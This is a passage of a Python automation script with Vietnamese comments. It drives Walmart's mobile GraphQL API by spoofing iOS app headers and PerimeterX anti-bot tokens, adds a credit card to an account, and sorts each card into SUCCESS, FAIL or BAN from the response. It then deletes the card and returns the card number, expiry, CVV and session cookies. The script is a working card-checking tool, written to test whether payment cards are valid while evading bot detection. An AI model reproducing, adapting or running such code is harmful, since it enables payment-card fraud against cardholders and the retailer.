           .header("X-O-Device", "iPhone8,2")
           .header("X-Wm-Client-Name", "glass")
           .header("X-O-Tp-Phase", "tp5")
           #.header("X-O-Device-Id", "65A12E02-7EDE-4990-95B0-B8FEC3FE58B1")
           .header("Baggage", "deviceType=ios,trafficType=release")
           .json(body_data)
           .label("walmart-create-credit-card-mobile")
           .via_tls()
           .timeout(30.0)
           .send())
    
    # Lưu response
    ctx.credit_card_mobile_response = r.text()
    ctx.credit_card_mobile_status = r.status
    ctx.credit_card_mobile_headers = dict(r.headers)
    
    # Debug: In ra response chi tiết
    #print(f"DEBUG - Mobile Credit Card Creation Status: {r.status}")
    #print(f"DEBUG - Mobile Credit Card Creation Response: {r.text()}")
    #print(f"DEBUG - Mobile Credit Card Creation Headers: {dict(r.headers)}")
    
    # Logic xử lý status theo yêu cầu
    body_text = ctx.credit_card_mobile_response or ""
    
    # 1) Nếu chứa ERROR_AVS_REJECTED => FAIL và stop
    if "ERROR_AVS_REJECTED" in body_text:
        ctx.status = "FAIL"
        ctx.credit_card_mobile_error = "ERROR_AVS_REJECTED"
        return
    
    # 2) Các trường hợp SUCCESS
    success_patterns = [
        "CVV verification failed",
        '"createAccountCreditCard":{"errors":[],"creditCard":{"__typename":"CreditCard"',
        '"isExpired":false,"needVerifyCVV":false,"isEditable":true',
        '"isDefault":',
        '"errors":[]'
    ]
    if any(p in body_text for p in success_patterns):
        ctx.status = "SUCCESS"
        # Lấy giá trị giữa "message":" và " nếu có
        import re as _re
        msg_match = _re.search(r'"message":"([^\"]*)"', body_text)
        if msg_match:
            ctx.message = msg_match.group(1)
        # Trích pay_id từ creditCard.id
        id_match = _re.search(r'"creditCard":\s*\{[^}]*"id"\s*:\s*"([^"]+)"', body_text)
        if id_match:
            ctx.pay_id = id_match.group(1)
        # Nếu đã có pay_id, tiếp tục gọi xoá payment ở step sau
        return
    
    # 3) Các trường hợp khác => BAN
    ctx.status = "BAN"
    raise AssertionError("BAN")

@step("delete_payment_method")
def delete_payment_method(ctx):
    """Xoá payment method bằng pay_id (chỉ chạy khi SUCCESS)"""
    #print(f"DEBUG - delete_payment_method: status={ctx.get('status')}, pay_id={ctx.get('pay_id')}")
    
    if ctx.get("status") != "SUCCESS":
        #print("DEBUG - delete_payment_method: SKIP - status != SUCCESS")
        return
    pay_id = ctx.get("pay_id")
    if not pay_id:
        #print("DEBUG - delete_payment_method: SKIP - no pay_id")
        return

    url = "https://www.walmart.com/orchestra/account/graphql/DeletePaymentMethod/a9f448aebcdbd8eed5848f793f35fd257ac2cb20bf3f25843c941b7ed90c3fbb"

    body_data = {
        "extensions": {"persistedQuery": {"sha256Hash": "a9f448aebcdbd8eed5848f793f35fd257ac2cb20bf3f25843c941b7ed90c3fbb", "version": 1}},
        "id": "a9f448aebcdbd8eed5848f793f35fd257ac2cb20bf3f25843c941b7ed90c3fbb",
        "operationName": "DeletePaymentMethod",
        "variables": {"id": str(pay_id), "input": None}
    }

    # Dùng cùng header style như create_credit_card_mobile
    px3_value = ctx.get("cookie_px3", "")
    if px3_value.startswith("_px3="):
        px3_value = px3_value[5:]

    r = (http.post(url)
           .header("X-O-Platform-Version", "25.12.2")
           .header("X-Enable-Server-Timing", "1")
           .header("X-Px-Os", "iOS")
           .header("X-O-Fuzzy-Install-Date", "1758800000000")
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("User-Agent", "WMT1H/25.12.2 iOS/15.8.4")
           .header("X-O-Mart", "B2C")
           .header("X-O-Segment", "oaoh")
           .header("X-Px-Mobile-Sdk-Version", "3.2.6")
           .header("X-O-Bu", "WALMART-US")
           .header("X-Latency-Trace", "1")
           .header("Accept-Language", "en-US")
           .header("X-Px-Authorization", f"3:{px3_value}")
           .header("Wm_mp", "true")
           .header("X-Apollo-Operation-Name", "DeletePaymentMethod")
           .header("X-O-Platform", "ios")
           .header("X-Px-Os-Version", "15.8.4")
           .header("Content-Type", "application/json; charset=UTF-8")
           .header("X-Px-Device-Model", "iPhone 6s Plus")
           .header("X-O-Device", "iPhone8,2")
           .header("X-Wm-Client-Name", "glass")
           .header("X-O-Tp-Phase", "tp5")
           .header("Baggage", "deviceType=ios,trafficType=release")
           .json(body_data)
           .label("walmart-delete-payment-method")
           .via_tls()
           .timeout(30.0)
           .send())

    ctx.delete_payment_status = r.status
    ctx.delete_payment_response = r.text()

@finalize
def done(ctx):
    """Kết thúc flow và trả về kết quả"""
    return {
        "status": ctx.get("status", "BAN"),
        "message": ctx.get("message"),
        "uuid": ctx.get("uuid"),
        "http_traces": len(ctx.meta.get("http_trace") or []),
        "CCNUM": ctx.CCNUM,
        "MM": ctx.MM,
        "YYYY": ctx.YYYY,
        "CCV": ctx.CCV,
        "PIEKEY": ctx.get("PIEKEY"),
        "key_id": ctx.get("key_id"),
        "protected_s": ctx.get("protected_s"),
        "protected_q": ctx.get("protected_q"),
        "protected_mac": ctx.get("protected_mac"),
        "legacy_mode": ctx.get("legacy_mode"),
        "cookie_all_via_tls": ctx.get("cookie_all_via_tls"),
        "cookies_before_membership": ctx.get("cookies_before_membership"),
        "cookies_after_membership": ctx.get("cookies_after_membership"),
        "Ua": ctx.get("Ua"),
        "sechua": ctx.get("sechua"),
        "pxhd": ctx.get("pxhd"),
        "session_proxy": ctx.get("session_proxy"),
        "cookie_px3": ctx.get("cookie_px3"),
        "cookie_pxhd": ctx.get("cookie_pxhd"),
        "px_ua": ctx.get("px_ua"),
        "px_sechua": ctx.get("px_sechua"),
        "cookie_pxvid": ctx.get("cookie_pxvid"),
        "cookie_pxcts": ctx.get("cookie_pxcts"),
        "captcha_plugin_used": True,
        "credit_card_mobile_status": ctx.get("credit_card_mobile_status"),
        "credit_card_mobile_success": ctx.get("credit_card_mobile_success", False),
        "credit_card_mobile_response_length": len(ctx.get("credit_card_mobile_response", "")),
        "credit_card_mobile_error": ctx.get("credit_card_mobile_error"),
        "pay_id": ctx.get("pay_id"),
        "delete_payment_status": ctx.get("delete_payment_status"),
        "delete_payment_response_len": len(ctx.get("delete_payment_response", "")),
    }

flow.register(globals())

if __name__ == "__main__":
    out = flow.run(data={}, session={}, options={"httpVersion":"h2"})
    print(json.dumps(out, ensure_ascii=False, indent=2))
